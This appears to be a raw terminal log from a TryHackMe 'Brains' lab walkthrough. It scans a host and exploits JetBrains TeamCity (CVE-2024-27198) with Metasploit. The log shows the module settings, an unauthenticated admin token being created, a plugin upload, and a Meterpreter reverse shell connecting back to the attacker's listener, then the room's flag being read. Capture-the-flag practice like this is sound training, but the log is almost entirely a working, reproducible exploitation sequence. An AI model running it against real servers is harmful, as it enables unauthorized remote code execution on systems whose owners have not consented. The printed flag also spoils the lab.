<code>

https://tryhackme.com/r/room/brains

### Enumeration

  ┌──(kali㉿kali)-[~]
└─$ nmap   -sV  -A -Pn  10.10.25.146
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 12:18 CET
Nmap scan report for 10.10.25.146
Host is up (0.033s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:0f:a0:3b:79:6f:b8:04:ab:05:55:f4:dd:28:e9:80 (RSA)
|   256 03:8e:fb:31:d9:56:47:45:55:74:5c:53:5d:d1:7b:f5 (ECDSA)
|_  256 cf:d4:05:8c:f3:f9:f9:95:57:84:54:2c:94:ce:70:9b (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Maintenance
50000/tcp open  ibm-db2?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 401 
|     TeamCity-Node-Id: MAIN_SERVER
|     WWW-Authenticate: Basic realm="TeamCity"
|     WWW-Authenticate: Bearer realm="TeamCity"
|     Cache-Control: no-store
|     Content-Type: text/plain;charset=UTF-8


### Found TeamCity CVE-2024-27198
  
  ┌──(kali㉿kali)-[~/Documents/THM/THM_Brains/CVE-2024-27198-RCE]
└─$ msfconsole       
Metasploit tip: Use the resource command to run commands from a file

       =[ metasploit v6.4.18-dev                          ]
+ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]
+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search CVE-2024-27198

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198  2024-03-04       excellent  Yes    JetBrains TeamCity Unauthenticated Remote Code Execution
   1    \_ target: Java                                         .                .          .      .
   2    \_ target: Java Server Page                             .                .          .      .
   3    \_ target: Windows Command                              .                .          .      .
   4    \_ target: Linux Command                                .                .          .      .
   5    \_ target: Unix Command                                 .                .          .      .


Interact with a module by name or index. For example info 5, use 5 or use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198                                                                                                      
After interacting with a module you can manually set a TARGET with set TARGET 'Unix Command'

msf6 > use 0
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                              yes       The target host(s), see https://docs.metasploit.com/docs/using-me
                                                 tasploit/basics/using-metasploit.html
   RPORT              8111             yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.22.122   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set RHOST 10.10.25.146
RHOST => 10.10.25.146
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS             10.10.25.146     yes       The target host(s), see https://docs.metasploit.com/docs/using-me
                                                 tasploit/basics/using-metasploit.html
   RPORT              8111             yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.22.122   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set RPORT 50000
RPORT => 50000
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set LHOST 10.9.0.254
LHOST => 10.9.0.254
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS             10.10.25.146     yes       The target host(s), see https://docs.metasploit.com/docs/using-me
                                                 tasploit/basics/using-metasploit.html
   RPORT              50000            yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.9.0.254       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > run

[*] Started reverse TCP handler on 10.9.0.254:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.a2R4a2lGZ2g2ZUFWQUsyU1lIOEo3QUdtQVYw.MTU3NDhkMzAtZTM1ZC00YWI2LThjNTktODExNTUxZjFmNDg2
[*] Uploading plugin: UoPScswU
[*] Sending stage (57971 bytes) to 10.10.25.146
[*] Deleting the plugin...
[+] Deleted /opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_UoPScswU
[+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/UoPScswU
[*] Meterpreter session 1 opened (10.9.0.254:4444 -> 10.10.25.146:52594) at 2025-01-30 13:18:26 +0100
[*] Deleting the authentication token...
[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/UoPScswU' on the target

meterpreter > ls
Listing: /opt/teamcity/TeamCity/bin
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  4096  dir   2025-01-30 10:54:01 +0100  .BuildServer
000667/rw-rw-rwx  0     fif   2025-01-30 10:53:22 +0100  .bash_history
100667/rw-rw-rwx  220   fil   2020-02-25 13:03:22 +0100  .bash_logout
100667/rw-rw-rwx  3771  fil   2020-02-25 13:03:22 +0100  .bashrc
040777/rwxrwxrwx  4096  dir   2024-07-02 11:39:13 +0200  .cache
040777/rwxrwxrwx  4096  dir   2025-01-30 12:05:51 +0100  .config
040777/rwxrwxrwx  4096  dir   2024-07-02 11:40:18 +0200  .local
100667/rw-rw-rwx  807   fil   2020-02-25 13:03:22 +0100  .profile
100667/rw-rw-rwx  66    fil   2024-07-02 11:59:35 +0200  .selected_editor
040777/rwxrwxrwx  4096  dir   2024-07-02 11:38:50 +0200  .ssh
100667/rw-rw-rwx  0     fil   2024-07-02 11:39:21 +0200  .sudo_as_admin_successful
100667/rw-rw-rwx  214   fil   2024-07-02 11:46:35 +0200  .wget-hsts
100666/rw-rw-rw-  4829  fil   2024-07-02 16:55:04 +0200  config.log
100666/rw-rw-rw-  38    fil   2024-07-02 12:05:47 +0200  flag.txt

meterpreter > cat flag.txt 
THM{faa9bac345709b6620a6200b484c7594}
meterpreter > 



<\code>
